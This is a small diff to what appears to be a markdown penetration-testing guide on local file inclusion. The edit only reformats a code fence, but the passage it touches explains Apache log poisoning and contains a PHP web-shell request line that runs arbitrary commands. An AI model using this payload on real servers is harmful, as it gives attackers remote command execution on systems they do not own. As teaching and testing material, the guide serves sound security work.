@@ -59,7 +59,8 @@ In some situations it's possible to abuse `/proc/self/environ` to execute a comm
 If Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.
 
 with netcat send a request like this:
-```GET /<?php system($_GET["cmd"]);?>
+```
+GET /<?php system($_GET["cmd"]);?>
 
 ```
 
